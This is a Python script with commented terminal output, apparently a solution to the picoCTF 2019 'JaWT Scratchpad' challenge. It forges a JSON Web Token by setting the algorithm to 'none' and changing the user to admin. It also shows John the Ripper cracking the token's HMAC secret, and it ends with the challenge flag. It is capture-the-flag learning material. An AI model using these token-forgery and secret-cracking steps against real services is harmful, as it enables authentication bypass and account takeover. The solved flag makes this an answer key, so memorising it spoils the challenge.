#!/usr/bin/python
# -*- coding: utf-8 -*-

jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW5hIn0.FdSv62eknnSSD3XxvTqpFZ3eBIshXCAE4USYq_EWSG4"
header, payload, signature  = jwt.split('.')

# Replacing the ALGO and the payload username
header  = header.decode('base64').replace('HS256',"none")
payload = (payload+"==").decode('base64').replace('test','admin')

header  = header.encode('base64').strip().replace("=","")
payload = payload.encode('base64').strip().replace("=","")

# 'The algorithm 'none' is not supported'
print( header+"."+payload+".")

# alanc@xps13:~/tools/john/run$ ./john --wordlist=rockyou.txt --rules ~/CTF/2019/pico/JaWT\ Scratchpad/jwt.john Using default input encoding: UTF-8
# Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
# Will run 8 OpenMP threads
# Press 'q' or Ctrl-C to abort, almost any other key for status
# ilovepico        (?)
# 1g 0:00:00:03 DONE (2019-09-30 16:13) 0.3278g/s 2428Kp/s 2428Kc/s 2428KC/s ilovetitoelbambino..ilovejesus71
# Use the "--show" option to display all of the cracked passwords reliably
# Session completed
# alanc@xps13:~/tools/john/run$ ./john --show ~/CTF/2019/pico/JaWT\ Scratchpad/jwt.john
# ?:ilovepico

# picoCTF{jawt_was_just_what_you_thought_c84a0d3754338763548dfc2dc171cdd0}